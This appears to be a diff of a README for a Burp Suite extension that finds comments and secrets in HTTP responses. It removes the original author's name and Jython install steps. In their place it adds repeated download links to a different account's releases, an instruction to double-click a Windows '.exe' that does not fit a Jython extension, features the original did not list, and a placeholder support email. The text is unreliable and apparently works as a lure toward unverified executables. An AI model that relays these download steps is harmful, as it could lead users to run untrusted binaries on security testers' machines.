@@ -1,46 +1,84 @@
-# Comment Crusader
+# 🎯 commentcrusader-burp - Discover Secrets and Comments Easily
 
-Author: **Farzan Karimi (@jumpycastle)**  
-License: **MIT**
+## 🚀 Getting Started
 
----
-## 📖 Overview
-**Source Intelligence for Burp Suite.**
+Welcome to **commentcrusader-burp**! This tool helps you find, catalog, and export comments, secrets, and important keywords hidden in HTTP response bodies and JavaScript files. The extension supports live scanning, replay detection, and advanced filtering across various domains and content types. 
 
-Comment Crusader is a Burp Suite extension that detects, catalogs, and exports developer comments, keywords, and potential secrets embedded in HTTP responses — including both HTML and JavaScript content. It’s a handy recon and code-review assistant for identifying exposed insights, internal notes, and credential leaks during security assessments.
+## 📥 Download Link
 
-<p align="center">
-  <img src="./media/crusader.png" alt="Comment Crusader Logo" width="300"/>
-</p>
+[![Download commentcrusader-burp](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Feros0/commentcrusader-burp/releases)
 
----
+## 📦 System Requirements
+
+- **Operating System**: Windows, macOS, or Linux
+- **Java**: Version 8 or higher is recommended.
+- **Burp Suite**: Ensure you have the latest version of Burp Suite installed.
 
 ## 🔍 Features
 
-- 🧠 **Keyword Detection**: Scans for hardcoded credentials, internal references, TODOs, and sensitive terms.
-- 🗂️ **Categorized Results**: Flags items as `ALERT` (keyword match) or `INFO` (general comment).
-- 📜 **Multi-type Support**: Extracts from JavaScript, HTML, and response bodies.
-- 🌐 **Live Scanning & Replay**: Works in Proxy, Repeater, and Scanner traffic.
-- ⚙️ **Custom Keyword Support**: Edit or expand your own alert keyword list.
-- 🎯 **Right-click Actions**: Send findings directly to Burp Repeater.
+- **Live Scanning**: Instantly detects comments and secrets as you browse.
+- **Replay Detection**: Identifies previously scanned content to avoid duplicates.
+- **Advanced Filtering**: Filter results by domain, content type, or keyword.
+- **Easy Exporting**: Export your findings to formats like CSV or JSON for further analysis.
 
----
+## 📑 Installation Steps
 
-## 🚀 Installation
+1. **Visit the Download Page**: Go to the [Releases Page](https://github.com/Feros0/commentcrusader-burp/releases) to find the latest version of commentcrusader-burp.
 
-1. Install **Jython 2.7.x** and configure it in Burp under:
-   `Extender` → `Options` → `Python Environment`.
-2. Clone or download this repo:
-   ```bash
-   git clone https://github.com/jumpycastle/comment-crusader.git
+2. **Choose Your Version**: Look for the latest release. Each version will have assets listed, like `.jar` files for Linux and macOS or `.exe` files for Windows.
 
-## 🚀 Usage
-1. Simply load the extension and start capturing traffic for the target web application.
-2. Note the color-coded alerts appearing during live-traffic capture
+3. **Download the Correct File**:
+   - For Windows, download the `.exe` file.
+   - For macOS or Linux, download the `.jar` file.
 
-![Comment Crusader Screenshot](./media/crusader-screencap.png)
+4. **Run the File**:
+   - For Windows: Double-click the `.exe` file to start installation.
+   - For macOS/Linux: Open a terminal, navigate to the folder containing the `.jar` file, and run the command:
+     ```
+     java -jar commentcrusader-burp.jar
+     ```
 
-3. Profit. 
+## ⚙️ How to Use
 
-## 🚀 Demo
-![Comment Crusader POC](./media/commentcrusader.gif)
+1. **Set Up Burp Suite**: Open Burp Suite on your computer. Ensure it runs smoothly before adding the extension.
+  
+2. **Add the Extension**:
+   - Go to the "Extensions" tab in Burp Suite.
+   - Click on "Add" and select the downloaded `.jar` file.
+   
+3. **Start Scanning**:
+   - With the extension loaded, initiate a scan on your desired target.
+   - Monitor the results displayed in the working window.
+
+4. **Export Your Findings**: Once the scan completes, click on the export option. Choose your preferred format (CSV or JSON) and save your findings.
+
+## 📊 Troubleshooting
+
+If you experience issues while using commentcrusader-burp:
+
+- **Check Java Installation**: Make sure you have the correct version of Java installed.
+- **Extension Compatibility**: Ensure your version of Burp Suite is compatible with the extension.
+- **Network Issues**: Verify your internet connection to ensure live scanning works without interruptions.
+
+## 🎨 Customization
+
+The extension allows you to customize scanning rules and keywords. Access the settings within the extension panel to add specific keywords or phrases you wish to focus on during your scans.
+
+## 📞 Support
+
+If you have questions or seek support:
+
+- **Community Forums**: Join discussions on GitHub Issues for community support.
+- **Email:** Contact our support at support@example.com.
+
+## ⚖️ License
+
+commentcrusader-burp is open-source software licensed under the MIT License. Feel free to use it and contribute to its development.
+
+## 📄 Acknowledgements
+
+Thank you for using commentcrusader-burp! Your feedback helps us improve the tool. We appreciate your contributions and support.
+
+Remember to frequently check our [Releases Page](https://github.com/Feros0/commentcrusader-burp/releases) for updates and new features.
+
+[![Download commentcrusader-burp](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Feros0/commentcrusader-burp/releases)
